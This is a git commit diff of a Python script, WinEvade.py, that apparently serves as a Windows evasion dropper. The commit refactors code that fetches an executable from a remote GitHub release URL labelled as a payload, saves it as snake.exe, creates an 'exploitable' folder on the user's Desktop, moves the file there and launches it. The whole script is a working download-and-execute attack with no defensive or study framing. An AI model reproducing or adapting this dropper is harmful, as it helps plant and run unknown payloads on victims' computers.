10ad57de1408b6884bd528e9d3dcdeba77f2e7bb
xemulat <98595166+xemulat@users.noreply.github.com>
2022-06-10 07:59:46 +0200

    Lightly Optimalization

--- WinEvade.py
+++ WinEvade.py
@@ -2,19 +2,15 @@ from sys import exit
 from urllib.request import urlretrieve
 from shutil import move
 import os
-from os import getlogin as getlogin, system as system
+from os import getlogin as getlogin, system as system, makedirs as makedirs
 
 replink = "https://github.com/xemulat/Basic-Redists/releases/download/1/basic.redists.exe"    #Payload Direct Download Link
 repname = "snake.exe"   #DO NOT TOUCH
 pyload = "C:/Users/" + getlogin() + "/Desktop/404"  #Exploitable Path (Can Be Changed!)
+makedirs(pyload)    #Make Exploitable Directory
 
-os.makedirs(pyload)
+urlretrieve(replink, repname)    #Download a file using UrlLib
 
-def powpow():   #Downloader Using UrlLib
-    urlretrieve(replink, repname)
-    
-powpow()    #Launch Downloader
-    
 move(repname, pyload)   #Move Downloaded File(Snake.exe) To Exploitable Path
 payloader = pyload + '/' + repname  #Set Path To Downloaded File
-os.system(payloader)    #Launch Downloaded File
+system(payloader)    #Launch Downloaded File
